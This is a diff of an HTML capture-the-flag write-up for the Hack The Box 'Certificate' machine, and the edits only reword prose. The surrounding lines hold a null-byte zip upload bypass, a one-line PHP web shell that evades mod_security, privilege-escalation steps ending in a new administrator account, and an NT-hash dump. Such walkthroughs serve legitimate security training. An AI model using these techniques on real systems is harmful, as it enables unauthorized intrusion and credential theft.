@@ -87,7 +87,7 @@
 <section class="wp-stage" id="upload" data-stage="1">
 <div class="wp-stage-lbl">Stage 1 &middot; Upload</div>
 <h2 class="wp-stage-title">A course portal that trusts the MIME header.</h2>
-<div class="wp-stage-body"><p>Nmap paints a <span class="hl-red">certificate.htb</span> AD footprint: DNS, HTTP (Apache 2.4.58 on port 80), Kerberos on 88, LDAP on 389, SMB on 445. DC01 is the domain controller.</p>
+<div class="wp-stage-body"><p>Nmap shows the AD services on <span class="hl-red">certificate.htb</span>: DNS, HTTP (Apache 2.4.58 on port 80), Kerberos on 88, LDAP on 389, SMB on 445. DC01 is the domain controller.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ nmap -A -T5 10.129.237.217 --min-rate 2000
@@ -118,7 +118,7 @@
 <section class="wp-stage" id="foothold" data-stage="2">
 <div class="wp-stage-lbl">Stage 2 &middot; Foothold</div>
 <h2 class="wp-stage-title">Null byte + .zip rename into PHP execution.</h2>
-<div class="wp-stage-body"><p>The trick: wrap the payload in an allowed <code>.zip</code>, rename the inner file to <code>dump.php\x00.pdf</code>. PHP on Windows honors the null byte before the extension, Apache still routes <code>.php</code> to the handler.</p>
+<div class="wp-stage-body"><p>Wrap the payload in an allowed <code>.zip</code> and name the inner file <code>dump.php\x00.pdf</code>. PHP on Windows honors the null byte before the extension, and Apache routes <code>.php</code> to the handler.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">zip-forge · operator@kali</span></div>
 <pre class="wp-term-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> os, zipfile
@@ -139,7 +139,7 @@ new_filename = <span class="hljs-string">&#x27;dump.php\x00.pdf&#x27;</span>
 </div>
 
 
-<p><code>system()</code> is flagged by XAMPP&#39;s mod_security defaults. Switching to <code>shell_exec</code> slips past:</p>
+<p>XAMPP&#39;s default mod_security rules flag <code>system()</code>. Switching to <code>shell_exec</code> gets past the filter:</p>
 <pre><code class="hljs language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])); <span class="hljs-meta">?&gt;</span></code></pre>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · shell.php · xamppuser</span></div>
@@ -212,7 +212,7 @@ INFO: Found 10 <span class="hljs-built_in">users</span>, 59 <span class="hljs-bu
 </div>
 
 
-<p><code>evil-winrm</code> back in as Ryan.K. <code>whoami /priv</code> shows the prize:</p>
+<p>Connect again with <code>evil-winrm</code> as Ryan.K and check <code>whoami /priv</code>:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · Ryan.K@certificate.htb</span></div>
 <pre class="wp-term-body"><code class="hljs language-powershell"><span class="hljs-built_in">PS</span> C:\Users\Ryan.K&gt; whoami /priv
@@ -224,7 +224,7 @@ SeIncreaseWorkingSetPrivilege  Increase a <span class="hljs-keyword">process</sp
 </div>
 
 
-<p><span class="hl-warn">SeManageVolumePrivilege</span> is the ticket.</p>
+<p>The account has <span class="hl-warn">SeManageVolumePrivilege</span>.</p>
 </div>
 </section>
 
@@ -234,7 +234,7 @@ SeIncreaseWorkingSetPrivilege  Increase a <span class="hljs-keyword">process</sp
 <section class="wp-stage" id="system" data-stage="5">
 <div class="wp-stage-lbl">Stage 5 &middot; System</div>
 <h2 class="wp-stage-title">SeManageVolumeAbuse and diaghub LOLBAS, to Administrator NT hash.</h2>
-<div class="wp-stage-body"><p>The privilege lets us change ACLs on any file. <code>xct/SeManageVolumeAbuse.exe C:\Windows\System32</code> opens the door, but <code>root.txt</code> itself is locked down by the box creator (some custom magic I couldn&#39;t unravel).</p>
+<div class="wp-stage-body"><p>The privilege lets us change ACLs on files. <code>xct/SeManageVolumeAbuse.exe C:\Windows\System32</code> changes access to System32, but <code>root.txt</code> itself is locked down by the box creator. I could not work out how.</p>
 <p>Plan B: LOLBAS <code>diaghub.exe</code> drops a payload into <code>System32\spool\drivers\color\</code> and executes as SYSTEM.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · Ryan.K@certificate.htb</span></div>
@@ -259,7 +259,7 @@ moriz          Nya.S      Ryan.K</code></pre>
 <figure class="wp-img"><img src="/assets/img/writeups/htb-certificate/05-net-user.png" alt="moriz joins the Administrators group after diaghub fires as SYSTEM" loading="lazy"><figcaption>moriz joins the Administrators group after diaghub fires as SYSTEM</figcaption></figure>
 
 
-<p>The new <span class="hl-ok">moriz</span> account is now in Administrators. <code>secretsdump.py</code> over the domain pops the Administrator NT hash:</p>
+<p>The new <span class="hl-ok">moriz</span> account is in Administrators. Run <code>secretsdump.py</code> against the domain to get the Administrator NT hash:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · moriz · impacket</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ secretsdump.py <span class="hljs-string">&#x27;certificate.htb/moriz:[REDACTED]@certificate.htb&#x27;</span>
